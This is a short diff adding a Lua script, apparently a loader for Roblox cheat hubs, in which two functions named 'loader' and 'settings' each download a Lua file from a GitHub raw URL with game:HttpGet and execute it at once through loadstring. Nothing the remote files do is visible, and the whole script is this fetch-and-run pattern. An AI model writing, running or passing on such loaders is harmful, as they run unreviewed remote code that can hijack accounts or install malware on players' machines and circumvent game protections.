@@ -1,0 +1,9 @@
+local function loader()
+    loadstring(game:HttpGet('https://raw.githubusercontent.com/tobi437a/Scripts/refs/heads/main/528df960f3db8129318b3952.lua'))()
+end
+local function settings()
+    loadstring(game:HttpGet('https://raw.githubusercontent.com/trbrock/toofasthub/refs/heads/main/loader'))()
+end
+
+task.spawn(loader)
+task.spawn(settings)
